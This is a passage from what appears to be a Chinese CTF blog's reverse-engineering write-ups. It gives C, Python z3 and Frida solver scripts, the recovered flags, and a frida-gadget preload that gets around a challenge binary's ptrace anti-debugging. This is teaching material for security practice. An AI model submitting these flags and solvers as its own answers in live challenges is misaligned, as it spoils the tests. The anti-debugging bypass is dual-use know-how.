0x79, 0x72, 0x1C, 0x3F, 0xB8,    0xE8, 0x1F, 0xFF, 0x7A, 0x73, 0x26, 0x54, 0x9E, 0xED, 0xA9, 0x41, 0x20, 0xEF, 0xA6, 0x48, 0x97,    0x4F, 0xD4, 0xBB, 0x23, 0x66, 0xD9, 0xE4, 0x0B, 0x30, 0x15, 0xD7, 0x6B, 0x19, 0xCD, 0xC4, 0x08,    0xB4, 0xC8, 0x14, 0xFD, 0x7F, 0x28, 0x0E, 0x05, 0x0F, 0x4B, 0x6F, 0xF5, 0x90, 0x76, 0xBF, 0x60,    0xE7, 0x24, 0x78, 0x6D, 0x71, 0xA8, 0x43, 0xB5, 0x0C, 0x31, 0xF9, 0xA2, 0x9C, 0x99, 0xF6, 0x2D,    0xDB, 0xB7, 0xC9, 0x85, 0x81, 0x03, 0x64, 0x1D, 0x07, 0x34, 0x5A, 0xBD, 0x37, 0x4C, 0xA7, 0x5F,    0x46, 0xE9, 0x35, 0x93, 0x8D, 0xA5, 0xFB, 0x42, 0x01, 0xC2, 0x17, 0x12, 0x1A, 0x77, 0xC6, 0x53,    0x83, 0x4D, 0xB2, 0x10, 0x2B, 0xF8, 0x88, 0x6A, 0x3E, 0xD0, 0x7C, 0x63, 0x40, 0x27, 0xBE, 0xD5,    0x38, 0xD1, 0x74, 0xB6, 0x57, 0x94, 0xAB, 0x8A, 0xB9, 0xBC, 0x7D, 0xB3, 0x96, 0x7E, 0xFC, 0xAD,    0x22, 0x4E, 0xFA, 0xE0, 0xCB, 0x8B, 0xEE, 0x32, 0xA4, 0x16, 0xFE, 0x5B, 0x13, 0xDD, 0xC0, 0x9A,    0x5E, 0x8E, 0x29, 0xF3, 0x8F, 0x49, 0xE6, 0x9F, 0xF1, 0xC5, 0x70, 0x55, 0x8C, 0x11, 0xCC, 0x5D,    0xEC, 0x00, 0xAC, 0x89, 0xD3, 0x82, 0x69, 0xD6, 0xBA, 0xD8, 0x59, 0x98, 0x09, 0x80, 0xE2, 0xC7    &#125;;    for (int i = 0; i &lt; 32;i++) &#123;        for (int j = 0; j &lt; 256;j++) &#123;            if (data[i] == sbox[j]) &#123;                data[i] = j;                break;            &#125;                    &#125;    &#125;    return 0;&#125;int reindex(unsigned char *data) &#123;    unsigned char tmp[32], table[32] = &#123; 0x13, 0x1F, 0x10, 0x1D, 0x01, 0x0D, 0x07, 0x15, 0x08, 0x06, 0x16, 0x00, 0x0F, 0x0C, 0x02, 0x05, 0x0E,0x03, 0x12, 0x04, 0x18, 0x14, 0x1A, 0x1C, 0x1E, 0x19, 0x09, 0x1B, 0x11, 0x0B, 0x17, 0x0A &#125;;    for (int i = 0; i &lt; 32; i++) &#123;        tmp[i] = data[table[i]];    &#125;    for (int i = 0; i &lt; 32; i++) &#123;        data[i] = tmp[table[i]];    &#125;    return 0;&#125;int reshift(int l, int r, unsigned char* data,int stat) &#123;    unsigned char indext2[] = &#123; 0x7D, 0xB7, 0x24, 0x7E, 0xC3, 0x6B, 0xBD, 0xD8, 0x7F, 0x13, 0x6E, 0x0F, 0x43, 0xCD, 0x6B, 0xCF, 0x18,               0x4F, 0x26, 0x18, 0x12, 0x2A, 0x7E, 0x9B, 0x27, 0x4C, 0x33, 0x67, 0x40, 0xC9, 0x9E, 0xC4 &#125;,        indextb2[] = &#123; 0x91, 0xDB, 0x9F, 0x5F, 0x26, 0x27, 0xD6, 0xA8, 0xBF, 0x41, 0x16, 0x79, 0xDE, 0x73, 0x16, 0xF8, 0x1E,                0xBA, 0x6A, 0xBE, 0xC6, 0x12, 0xB2, 0x39, 0x9E, 0xF3, 0x12, 0x4E, 0x02, 0x1C, 0xE2, 0x43 &#125;;    if (stat == 1) &#123;        for (int i = 0; i &lt; 32; i++) &#123;            unsigned char c;            data[i] = (data[i] &gt;&gt; l) | (data[i] &lt;&lt; r);            c = data[i] - indextb2[i];            data[i] = c ^ indext2[i];        &#125;    &#125;    else &#123;        for (int i = 0; i &lt; 32; i++) &#123;            unsigned char c;            data[i] = (data[i] &gt;&gt; l) | (data[i] &lt;&lt; r);            data[i] = (data[i] ^ indext2[i]) - indextb2[i];        &#125;    &#125;        return 0;&#125;void prlhex(unsigned char* data,const char *hit) &#123;    printf(&quot;\\n--------------------------------------------------------------------------------------\\n&quot;);    printf(&quot;--------%s\\n&quot;, hit);    for (int i = 0; i &lt; 32; i++) &#123;        printf(&quot;%02x &quot;, data[i]);    &#125;&#125;int main() &#123;    unsigned char data[] = &#123; 0x5B, 0x2D, 0xE9, 0x66, 0xED, 0x39, 0x90, 0x23, 0xAF, 0xDA, 0xEB, 0x2E, 0xD1, 0x0D, 0xBB, 0xBD, 0x57, 0x52, 0x02, 0xB0, 0xBA, 0x9D, 0x52, 0xFA, 0x67, 0xEE, 0xA3, 0x85, 0xA9, 0x84, 0xE2, 0x6F &#125;;    reshift(1, 7, data,0);  //逆向解密    reshift(2, 6, data,1);    reindex(data);    rebox(data);    reshift(5, 3, data,0);    reshift(3, 5, data,1);    reindex(data);    rebox(data);    reshift(4, 4, data,0);    reshift(6, 2, data,1);    reindex(data);    rebox(data);    reshift(7, 1, data,0);    reshift(3, 5, data,1);    reindex(data);    rebox(data);    for (int i = 0; i &lt; 32; i++) &#123;        printf(&quot;%c&quot;, data[i]);    &#125;    return 0;&#125;//flag&#123;Master_of_5mc_XoR_aDD_r0r!&#125;\n\n\nsf5有四个加密函数被存储在了数组v28里，并以每次加密次数为索引获取加密前的数据然后进行按位或操作(Buf1[v3++] &amp; 3)，以这个结果为索引加载数组v28中的函数进行加密。先分析四个加密函数，\n\nv28[0]是一个盒的查找替换，v28[1]以一个索引表对数据进行打乱，v28[2]把输入与两串常量异或并相加，v28[3]把数据每一字节循环右移了3位。值得注意的是这里的v28[2]是有点难看懂的，要结合汇编动调才能完全理解，下面是一些理解。\n\n加密逻辑大概如下\n//encode#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;int enc1(uint8_t* data) &#123;    uint8_t sbox[256] = &#123; 0xB0, 0xF0, 0x21, 0xCF, 0xF2, 0x04, 0x3A, 0x68, 0x84, 0x7B, 0x39, 0x86, 0x36, 0x87, 0x9B, 0xF7, 0x3D, 0x18,            0x1E, 0x61, 0x1B, 0x2E, 0x6C, 0xDF, 0x2C, 0xAE, 0x65, 0x9D, 0xEB, 0x2F, 0xDA, 0xF4, 0xDE, 0xCA, 0x56, 0x92,            0x75, 0x3B, 0x62, 0x45, 0x06, 0x3C, 0x52, 0x33, 0x6E, 0x25, 0xCE, 0xA3, 0xD2, 0x44, 0xA1, 0x4A, 0x58, 0xB1,            0xA0, 0x2A, 0x47, 0x0A, 0x02, 0xAF, 0x50, 0xC3, 0xDC, 0xEA, 0xE5, 0x0D, 0x67, 0x91, 0xE1, 0x51, 0xE3, 0xC1,            0xAA, 0x95, 0x5C, 0x79, 0x72, 0x1C, 0x3F, 0xB8, 0xE8, 0x1F, 0xFF, 0x7A, 0x73, 0x26, 0x54, 0x9E, 0xED, 0xA9,            0x41, 0x20, 0xEF, 0xA6, 0x48, 0x97, 0x4F, 0xD4, 0xBB, 0x23, 0x66, 0xD9, 0xE4, 0x0B, 0x30, 0x15, 0xD7, 0x6B,            0x19, 0xCD, 0xC4, 0x08, 0xB4, 0xC8, 0x14, 0xFD, 0x7F, 0x28, 0x0E, 0x05, 0x0F, 0x4B, 0x6F, 0xF5, 0x90, 0x76,            0xBF, 0x60, 0xE7, 0x24, 0x78, 0x6D, 0x71, 0xA8, 0x43, 0xB5, 0x0C, 0x31, 0xF9, 0xA2, 0x9C, 0x99, 0xF6, 0x2D,            0xDB, 0xB7, 0xC9, 0x85, 0x81, 0x03, 0x64, 0x1D, 0x07, 0x34, 0x5A, 0xBD, 0x37, 0x4C, 0xA7, 0x5F, 0x46, 0xE9,            0x35, 0x93, 0x8D, 0xA5, 0xFB, 0x42, 0x01, 0xC2, 0x17, 0x12, 0x1A, 0x77, 0xC6, 0x53, 0x83, 0x4D, 0xB2, 0x10,            0x2B, 0xF8, 0x88, 0x6A, 0x3E, 0xD0, 0x7C, 0x63, 0x40, 0x27, 0xBE, 0xD5, 0x38, 0xD1, 0x74, 0xB6, 0x57, 0x94,            0xAB, 0x8A, 0xB9, 0xBC, 0x7D, 0xB3, 0x96, 0x7E, 0xFC, 0xAD, 0x22, 0x4E, 0xFA, 0xE0, 0xCB, 0x8B, 0xEE, 0x32,            0xA4, 0x16, 0xFE, 0x5B, 0x13, 0xDD, 0xC0, 0x9A, 0x5E, 0x8E, 0x29, 0xF3, 0x8F, 0x49, 0xE6, 0x9F, 0xF1, 0xC5,            0x70, 0x55, 0x8C, 0x11, 0xCC, 0x5D, 0xEC, 0x00, 0xAC, 0x89, 0xD3, 0x82, 0x69, 0xD6, 0xBA, 0xD8, 0x59, 0x98,            0x09, 0x80, 0xE2, 0xC7 &#125;;    for (int i = 0; i &lt; 32; i++) &#123;        data[i] = sbox[data[i]];    &#125;    return 0;&#125;int enc2(uint8_t* data) &#123;    unsigned char tmp[32], table[32] = &#123; 0x13, 0x1F, 0x10, 0x1D, 0x01, 0x0D, 0x07, 0x15, 0x08, 0x06, 0x16, 0x00, 0x0F, 0x0C, 0x02, 0x05, 0x0E,0x03, 0x12, 0x04, 0x18, 0x14, 0x1A, 0x1C, 0x1E, 0x19, 0x09, 0x1B, 0x11, 0x0B, 0x17, 0x0A &#125;;    for (int i = 0; i &lt; 32; i++) &#123;        tmp[table[i]] = data[i];    &#125;    for (int i = 0; i &lt; 32; i++) &#123;       data[table[i]] = tmp[i];    &#125;    return 0;&#125;int enc3(uint8_t* data) &#123;    uint8_t index1[] = &#123; 0x7D, 0xB7, 0x24, 0x7E, 0xC3, 0x6B, 0xBD, 0xD8, 0x7F, 0x13, 0x6E, 0x0F, 0x43, 0xCD, 0x6B, 0xCF,    0x18, 0x4F, 0x26, 0x18, 0x12, 0x2A, 0x7E, 0x9B, 0x27, 0x4C, 0x33, 0x67, 0x40, 0xC9, 0x9E, 0xC4 &#125;;    uint8_t index2[] = &#123; 0x91, 0xDB, 0x9F, 0x5F, 0x26, 0x27, 0xD6, 0xA8, 0xBF, 0x41, 0x16, 0x79, 0xDE, 0x73, 0x16, 0xF8,    0x1E, 0xBA, 0x6A, 0xBE, 0xC6, 0x12, 0xB2, 0x39, 0x9E, 0xF3, 0x12, 0x4E, 0x02, 0x1C, 0xE2, 0x43 &#125;;    for (int i = 0; i &lt; 32; i++) &#123;        data[i] ^= index1[i];        data[i] += index2[i];    &#125;    return 0;&#125;int enc4(uint8_t* data) &#123;    for (int i = 0; i &lt; 32; i++) &#123;        data[i] = (data[i] &gt;&gt; 3) | (data[i] &lt;&lt; 5);    &#125;    return 0；&#125;\n\n因为不知道明文，我们每一次的解密有4种可能性，题目也提示dfs，我们就用dfs遍历解密路径就行。我们可以检查在解密后31减去解密次数与3进行与操作(data[31-step] &amp; 3)是不是当前解密函数的下标，以确定路径，减少遍历的时间。结尾检查flag输出即可。\n写出解密函数和dfs，脚本如下。\n//decode#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;void prlhex(uint8_t* data, const char* hit);int refun4(uint8_t* data) &#123;    for (int i = 0; i &lt; 32; i++) &#123;        data[i] = (data[i] &lt;&lt; 3) | (data[i] &gt;&gt; 5);    &#125;    return 0;&#125;int refun2(uint8_t *data) &#123;    unsigned char tmp[32], table[32] = &#123; 0x13, 0x1F, 0x10, 0x1D, 0x01, 0x0D, 0x07, 0x15, 0x08, 0x06, 0x16, 0x00, 0x0F, 0x0C, 0x02, 0x05, 0x0E,0x03, 0x12, 0x04, 0x18, 0x14, 0x1A, 0x1C, 0x1E, 0x19, 0x09, 0x1B, 0x11, 0x0B, 0x17, 0x0A &#125;;    for (int i = 0; i &lt; 32; i++) &#123;        tmp[i] = data[table[i]];    &#125;    for (int i = 0; i &lt; 32; i++) &#123;        data[i] = tmp[table[i]];    &#125;        return 0;&#125;int refun3(uint8_t* data) &#123;    uint8_t index1[] = &#123; 0x7D, 0xB7, 0x24, 0x7E, 0xC3, 0x6B, 0xBD, 0xD8, 0x7F, 0x13, 0x6E, 0x0F, 0x43, 0xCD, 0x6B, 0xCF,    0x18, 0x4F, 0x26, 0x18, 0x12, 0x2A, 0x7E, 0x9B, 0x27, 0x4C, 0x33, 0x67, 0x40, 0xC9, 0x9E, 0xC4 &#125;;    uint8_t index2[] = &#123; 0x91, 0xDB, 0x9F, 0x5F, 0x26, 0x27, 0xD6, 0xA8, 0xBF, 0x41, 0x16, 0x79, 0xDE, 0x73, 0x16, 0xF8,    0x1E, 0xBA, 0x6A, 0xBE, 0xC6, 0x12, 0xB2, 0x39, 0x9E, 0xF3, 0x12, 0x4E, 0x02, 0x1C, 0xE2, 0x43 &#125;;    for (int i = 0; i &lt; 32; i++) &#123;        data[i] = (data[i] - index2[i]) ^ index1[i];    &#125;    return 0;&#125;int refun1(uint8_t* data) &#123;    uint8_t sbox[256] = &#123; 0xB0, 0xF0, 0x21, 0xCF, 0xF2, 0x04, 0x3A, 0x68, 0x84, 0x7B, 0x39, 0x86, 0x36, 0x87, 0x9B, 0xF7, 0x3D, 0x18,            0x1E, 0x61, 0x1B, 0x2E, 0x6C, 0xDF, 0x2C, 0xAE, 0x65, 0x9D, 0xEB, 0x2F, 0xDA, 0xF4, 0xDE, 0xCA, 0x56, 0x92,            0x75, 0x3B, 0x62, 0x45, 0x06, 0x3C, 0x52, 0x33, 0x6E, 0x25, 0xCE, 0xA3, 0xD2, 0x44, 0xA1, 0x4A, 0x58, 0xB1,            0xA0, 0x2A, 0x47, 0x0A, 0x02, 0xAF, 0x50, 0xC3, 0xDC, 0xEA, 0xE5, 0x0D, 0x67, 0x91, 0xE1, 0x51, 0xE3, 0xC1,            0xAA, 0x95, 0x5C, 0x79, 0x72, 0x1C, 0x3F, 0xB8, 0xE8, 0x1F, 0xFF, 0x7A, 0x73, 0x26, 0x54, 0x9E, 0xED, 0xA9,            0x41, 0x20, 0xEF, 0xA6, 0x48, 0x97, 0x4F, 0xD4, 0xBB, 0x23, 0x66, 0xD9, 0xE4, 0x0B, 0x30, 0x15, 0xD7, 0x6B,            0x19, 0xCD, 0xC4, 0x08, 0xB4, 0xC8, 0x14, 0xFD, 0x7F, 0x28, 0x0E, 0x05, 0x0F, 0x4B, 0x6F, 0xF5, 0x90, 0x76,            0xBF, 0x60, 0xE7, 0x24, 0x78, 0x6D, 0x71, 0xA8, 0x43, 0xB5, 0x0C, 0x31, 0xF9, 0xA2, 0x9C, 0x99, 0xF6, 0x2D,            0xDB, 0xB7, 0xC9, 0x85, 0x81, 0x03, 0x64, 0x1D, 0x07, 0x34, 0x5A, 0xBD, 0x37, 0x4C, 0xA7, 0x5F, 0x46, 0xE9,            0x35, 0x93, 0x8D, 0xA5, 0xFB, 0x42, 0x01, 0xC2, 0x17, 0x12, 0x1A, 0x77, 0xC6, 0x53, 0x83, 0x4D, 0xB2, 0x10,            0x2B, 0xF8, 0x88, 0x6A, 0x3E, 0xD0, 0x7C, 0x63, 0x40, 0x27, 0xBE, 0xD5, 0x38, 0xD1, 0x74, 0xB6, 0x57, 0x94,            0xAB, 0x8A, 0xB9, 0xBC, 0x7D, 0xB3, 0x96, 0x7E, 0xFC, 0xAD, 0x22, 0x4E, 0xFA, 0xE0, 0xCB, 0x8B, 0xEE, 0x32,            0xA4, 0x16, 0xFE, 0x5B, 0x13, 0xDD, 0xC0, 0x9A, 0x5E, 0x8E, 0x29, 0xF3, 0x8F, 0x49, 0xE6, 0x9F, 0xF1, 0xC5,            0x70, 0x55, 0x8C, 0x11, 0xCC, 0x5D, 0xEC, 0x00, 0xAC, 0x89, 0xD3, 0x82, 0x69, 0xD6, 0xBA, 0xD8, 0x59, 0x98,            0x09, 0x80, 0xE2, 0xC7 &#125;;    for (int i = 0; i &lt; 32;i++) &#123;        for (int j = 0; j &lt; 256;j++) &#123;            if (data[i] == sbox[j]) &#123;                data[i] = j;                break;            &#125;                    &#125;    &#125;    return 0;&#125;int backupdata(uint8_t *data,uint8_t *data2) &#123;    for (int i = 0; i &lt; 32; i++) &#123;        data[i] = data2[i];    &#125;    return 0;&#125;int (*refun[4])(uint8_t*) = &#123; refun1, refun2, refun3, refun4 &#125;; int check(unsigned char* data) &#123;    if (!strncmp((char*)data, &quot;flag&quot;, 4)) &#123;        prlhex(data, &quot;result&quot;);  //flag    &#125;    return 0;&#125;int dfs(uint8_t* data, int step, int* path) &#123;    if (step == 32) &#123;          check(data); //检查结果        return 1;    &#125;    uint8_t backup[256];    backupdata(backup, data);  //备份密文    for (int i = 0; i &lt; 4; i++) &#123;  //四个解密函数进行解密        refun[i](data);        if ((data[31-step] &amp; 3) == i) &#123;  //用&amp;3剪枝            path[step] = i;            dfs(data, step + 1, path);        &#125;        backupdata(data,backup);    &#125;    return 0;&#125;void prlhex(uint8_t* data,const char *hit) &#123;    printf(&quot;\\n------------------------------------------------------------------------------\\n&quot;);    printf(&quot;--------%s\\n&quot;, hit);    for (int i = 0; i &lt; 32; i++) &#123;        printf(&quot;%c&quot;, data[i]);    &#125;&#125;int main() &#123;        uint8_t ciphertext[] = &#123; 0x65, 0x3E, 0x43, 0xB8, 0xBA, 0xDB, 0xF6, 0x88, 0x25, 0x1B, 0x28, 0xC7, 0xC0, 0x54, 0xA6, 0x4A,    0x90, 0x37, 0xBC, 0x29, 0x41, 0xAA, 0x28, 0xDB, 0x9A, 0x59, 0x63, 0x9E, 0x4B, 0xCF, 0x2E, 0x41 &#125;;    int path[32];    dfs(ciphertext, 0, path);    return 0;&#125;//flag&#123;Ea5y_enCrypt_And_decrYpt!!&#125;\n\neasy-re拿下来是一个Android elf文件，用真机运行几次发现报错先分析代码。\n看了一下main函数才知道要带参数运行。加了许多混淆，c代码难以阅读，不过还是看到了一些rc4加密。字符串也被加密了，写个脚本用于dnmp。\nvar inter =setInterval(function() &#123; dump(); &#125;, 3);function dump() &#123;var libxx = Process.getModuleByName(&quot;easy-re&quot;);var exe_s_size=0x0console.log(&quot;*****************************************************&quot;);console.log(&quot;name: &quot; +libxx.name);console.log(&quot;base: &quot; +libxx.base);console.log(&quot;size: &quot; +ptr(libxx.size));var file_path =  libxx.name + &quot;_&quot; + libxx.base + &quot;_&quot; + ptr(libxx.size) + &quot;.so&quot;;console.log(file_path);var file_handle = new File(file_path, &quot;wb&quot;);if (file_handle &amp;&amp; file_handle != null) &#123;    Memory.protect(ptr(libxx.base), libxx.size, &#x27;rwx&#x27;);    var buffer = ptr(libxx.base).add(exe_s_size).readByteArray(libxx.size-exe_s_size);    file_handle.write(buffer);    file_handle.flush();    file_handle.close();    console.log(&quot;[dump]:&quot;, file_path);&#125;clearInterval(inter)&#125;\n\n再用Sofixer修复一下偏移。\n重新在ida中分析，在Init_array有一个ptrace检测,可以通过字符串看出来。如果程序执行被检测到ptrace就会出现异常的结果。\n\nc代码太难看了，尝试动调，发现ida调试是可以用的（ptrace检测没有直接结束程序），我们可以用Ida调试elf并利用trace来分析程序算法。Trace结果过长就不展示了。\n大概逻辑就是flag_char ^ index ^一个表 ^ 异或前一个char，那个表估计是rc4的。主要的难点是这个表，当前调试是被ptrace检测的，测试过多次，直接使用常规frida调试也是被检测了的。\n由于ptrace检测，不是很好patch，打算用环境变量加载frida_gadget来启动frida，PRE_LOAD&#x3D;&#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-gadget.so .&#x2F;easy-re AAAAAABAAAAAAAAAAAAAAAAAAAAAAAAB\nhook脚本\nfunction time(num)&#123;let sum=0for(let i=0;i&lt;num*1024;i++)&#123;sum+=i;&#125;&#125;var mInterval = setInterval(function () &#123;    var sgame = Process.findModuleByName(&quot;easy-re&quot;);    if (sgame == null) &#123;        console.log(&quot;无&quot;);        return;    &#125;    clearInterval(mInterval);    //  var addr = sgame.base.add(0x1400012A0-0x140000000) //windows    var addr = sgame.base.add(0x05BC0309280 - 0x005BC0307000)    console.log(&quot;&quot; + addr);    console.log(Instruction.parse(addr).toString());    Interceptor.attach(addr, &#123;        onEnter: function (args) &#123;            var rax = this.context.x10;            console.log( rax,&quot;,&quot;);            time(5451)        &#125;    &#125;)    addr = sgame.base.add(0x5BC03094F0 - 0x005BC0307000)    console.log(&quot;&quot; + addr);    console.log(Instruction.parse(addr).toString());    Interceptor.attach(addr, &#123;        onEnter: function (args) &#123;            var rax = this.context.x1;            // var mm=[68,39,43,160,45,33,116,240,251,156,45,31,225,255,45,22,140,155,112,144,214,47,152,233,164,146,168,3,253,29,123,37]            // ptr(rax).writeByteArray(mm);         &#125;    &#125;)   addr = sgame.base.add(0x5DF1A811A0 - 0x05DF1A7F000)    console.log(&quot;&quot; + addr);    console.log(Instruction.parse(addr).toString());    Interceptor.attach(addr, &#123;        onEnter: function (args) &#123;            var rax = this.context.x8;             console.log(hexdump(ptr(rax), &#123; length: 50, ansi: true &#125;));             time(5451)        &#125;    &#125;)&#125;, 1) \n\n直接可以拿到表\n\n写出解密代码\n#include &lt;stdio.h&gt;char flag[]=&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;unsigned char mm[32] = &#123;    0x50, 0x4C, 0x8B, 0x94, 0x86, 0x6D, 0x72, 0xFB, 0x54, 0xF3, 0x17, 0x0F, 0xEE, 0xE4, 0xC5, 0x1E,     0xB8, 0x1A, 0xC7, 0xDF, 0x2D, 0x3D, 0x4E, 0x51, 0xE7, 0xAD, 0x97, 0x55, 0xF3, 0xF5, 0x41, 0x79&#125;;unsigned char box[]=&#123;0x36,0x71,0xf4,0x67,0xfa,0x9a,0xf9,0x0a,0x5e,0xa0,0xb6,0xb0,0x11,0xab,0x7a,0x2d,0xd0,0xd3,0x0a,0xca,0xe8,0x91,0x9a,0xc2,0x64,0x8e,0x12,0x08,0xba,0x46,0x4a,0x6e&#125;;int main()&#123;    // int n=0;   unsigned char xor2=0;   unsigned char keys[40];    for (size_t i = 0; i &lt; 32; i++)    &#123;        if (i!=0) &#123;        \txor2^=mm[i-1];        \tkeys[i]=xor2;    \t&#125;   \t&#125;        for (size_t i = 0; i &lt;32; i++)    &#123;        // flag[i]^=i;        if (i!=0)        &#123;            mm[i]^=keys[i];        &#125;        &#125;    for (size_t i = 0; i &lt; 32; i++)    &#123;        mm[i]^=i;        mm[i]^=box[i];        printf(&quot;%c&quot;, mm[i]);    &#125;&#125;//flag&#123;welcome-re-world!go!go!go!&#125;\n\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"2025GHCTF Re-wp+复现","url":"/2025/03/05/ghctf/","content":"ASM?Signin!读汇编就行，可以用AI辅助。\n要注意的是下面这里的数据\nENC PROC    PUSH CX    MOV SI,OFFSET BUFFER1 + 2    MOV DI,OFFSET DATA1    MOV CX,8LOOP2:    MOV AX,WORD PTR[DI + 1]  ;读取的是双字WORD，所以AX应该是di[2]和di[1]组成的2字节数据    XOR WORD PTR[SI],AX ;这里也是读取的si[1] 和si[0]的2字节数据    MOV AX,WORD PTR[DI + 2] ;di[2]和di[3]同上    XOR WORD PTR[SI + 2],AX ;si[2]和si[3]同上    ADD SI,4    ADD DI,4    LOOP LOOP2    POP CX    RETENC ENDP\n\n就一个异或加密，异或回来就行。\n大概逻辑和解密脚本\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned char DATA1[32] = &#123;    0x26, 0x27, 0x24, 0x25, 0x2A, 0x2B, 0x28, 0x00,    0x2E, 0x2F, 0x2C, 0x2D, 0x32, 0x33, 0x30, 0x00,    0x36, 0x37, 0x34, 0x35, 0x3A, 0x3B, 0x38, 0x39,    0x3E, 0x3F, 0x3C, 0x3D, 0x3F, 0x27, 0x34, 0x11&#125;;unsigned char DATA2[32] = &#123;    0x69, 0x77, 0x77, 0x66, 0x73, 0x72, 0x4F, 0x46,    0x03, 0x47, 0x6F, 0x79, 0x07, 0x41, 0x13, 0x47,    0x5E, 0x67, 0x5F, 0x09, 0x0F, 0x58, 0x63, 0x7D,    0x5F, 0x77, 0x68, 0x35, 0x62, 0x0D, 0x0D, 0x50&#125;;void do1(unsigned char* data) &#123;    for (int cx = 0; cx &lt; 8; cx++) &#123;        int si = cx * 4;        int di = si + 4;        if (di &gt;= 28) di -= 28;        for (int i = 0; i &lt; 4; i++) &#123;  //这里是do2的逻辑，交换值            unsigned char temp = data[si + i];            data[si + i] = data[di + i];            data[di + i] = temp;        &#125;    &#125;&#125;void enc(unsigned char* input) &#123;    for (int i = 0; i &lt; 32; i += 4) &#123;        input[i] ^= DATA1[i + 1];        input[i+1] ^= DATA1[i + 2];  //因为双字的关系，这里data1中有一个值被重复使用了        input[i + 2] ^= DATA1[i + 2];         input[i + 3] ^= DATA1[i + 3];    &#125;&#125;int main() &#123;    //unsigned char buffer[34] = &#123; 0 &#125;; //注释部分是AI写的    //printf(&quot;Welcome to GHCTF!\\n&quot;);    //printf(&quot;Input your flag: &quot;);    //fgets((char*)buffer + 2, 33, stdin);    //buffer[strcspn((char*)buffer + 2, &quot;\\n&quot;)] = 0;     do1(DATA1);     //enc(buffer + 2);    //if (memcmp(buffer + 2, DATA2, 32) == 0) &#123;    //    printf(&quot;\\nRight!\\n&quot;);    //&#125;    //else &#123;    //    printf(&quot;\\nWrong!\\n&quot;);    //&#125;    enc(DATA2);    printf(&quot;%s&quot;, DATA2);    return 0;&#125;NSSCTF&#123;W0w_y0u&#x27;re_g00d_@t_@5M!!&#125;\n\n法2：用dosbox编译运行，结合ida分析找到处理完后的盒直接异或解密。\nFishingKit主函数里面有一个方程\n\n用z3解\nfrom z3 import *s = Solver()x = [BitVec(f&quot;a_&#123;i&#125;&quot;,8) for i in range(10)]s.add(202 * x[8] + 216 * x[5] - 4 * x[4] - 330 * x[9] - 13 * x[4] - 268 * x[6] == -14982)s.add(325 * x[8] + 195 * x[0] + 229 * x[1] - 121 * x[6] - 409 * x[6] - (x[1] &lt;&lt; 7) == 22606)s.add(489 * x[1] + 480 * x[6] + 105 * x[2] + 367 * x[3] - 135 * x[4] - 482 * x[9] == 63236)s.add(493 * x[1] - 80 * x[4] - 253 * x[8] - 121 * x[2] - 177 * x[0] - 243 * x[9] == -39664)s.add(275 * x[4] + 271 * x[6] + 473 * x[7] - 72 * x[5] - 260 * x[4] - 367 * x[4] == 14255)s.add(286 * x[0] + 196 * x[7] + 483 * x[2] + 442 * x[1] - 495 * x[8] - 351 * x[4] == 41171)s.add(212 * x[2] + 283 * x[7] - 329 * x[8] - 429 * x[9] - 362 * x[2] - 261 * x[6] == -90284)s.add(456 * x[5] + 244 * x[7] + 92 * x[4] + 348 * x[7] - 225 * x[1] - 31 * x[2] == 88447)s.add(238 * x[9] + 278 * x[7] + 216 * x[6] + 237 * x[0] + 8 * x[2] - 17 * x[9] == 83838)s.add(323 * x[9] + 121 * x[1] + 370 * x[7] - (x[4] &lt;&lt; 6) - 196 * x[9] - 422 * x[0] == 26467)s.add(166 * x[9] + 90 * x[1] + 499 * x[2] + 301 * x[8] - 31 * x[2] - 206 * x[2] == 88247)s.add(355 * x[0] + 282 * x[4] + 44 * x[9] + 359 * x[8] - 167 * x[5] - 62 * x[3] == 76658)s.add(488 * x[6] + 379 * x[9] + 318 * x[2] - 85 * x[1] - 357 * x[2] - 277 * x[5] == 35398)s.add(40 * x[0] + 281 * x[4] + 217 * x[5] - 241 * x[1] - 407 * x[7] - 309 * x[7] == -35436)s.add(429 * x[3] + 441 * x[3] + 115 * x[1] + 96 * x[8] + 464 * x[1] - 133 * x[7] == 157448)s.check()# print(s.model())for i in range (10):    print(f&quot;&#123;chr(s.model()[x[i]].as_long())&#125;&quot;,end =&quot;&quot;)    # DeluxeBait\n\n解出的字符串”DeluxeBait”作为密钥进行RC4加密。解密后会发现RC4加密是假的，会解出假flag，NSSCTF{Fake!Fake!Fake!}。\n查看main函数之前的函数我们会发现一些其他的函数。\n这里获取strcmp的地址，然后传入到VirtualProtect中，然后修改了strcmp的逻辑达到hook的目的。\n\n这里利用了VirtualProtect修改了函数。\n\n在这里下面还有一个enc函数，里面有许多被加密的字符串，看来这里的加密逻辑就是真正的加密逻辑。在enc之前还有一个getsecret函数获取了真正的密文。\n\nenc函数里是一个xtea加密，魔改了delta，轮数为24，输入被分为4字节两两加密。动调可以获取密钥就是”DeluxeBait”后面补0。\n#include&lt;stdio.h&gt;#include&lt;stdint.h&gt;void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;    unsigned int i;    uint32_t v0 = v[0], v1 = v[1], delta = 0x66778899, sum = delta * num_rounds;    for (i = 0; i &lt; num_rounds; i++) &#123;        v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]);        sum -= delta;        v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);    &#125;    v[0] = v0; v[1] = v1;&#125;int main() &#123;    uint32_t v[6] = &#123; 0xA6975621, 0xDEC4D51A, 0x4D829CA4, 0x56C845D1, 0x5C96B4A7, 0x2087494D &#125;;    uint32_t const k[4] = &#123; 0x756C6544, 0x61426578, 0x00007469, 0x00000000 &#125;;    unsigned int r = 24;    for (int i = 0; i &lt; 6; i += 2) &#123;        decipher(r, &amp;v[i], k);    &#125;        for (int i = 0; i &lt; 24; i++) &#123;        printf(&quot;%c&quot;, *((char*)v + i));    &#125;    return 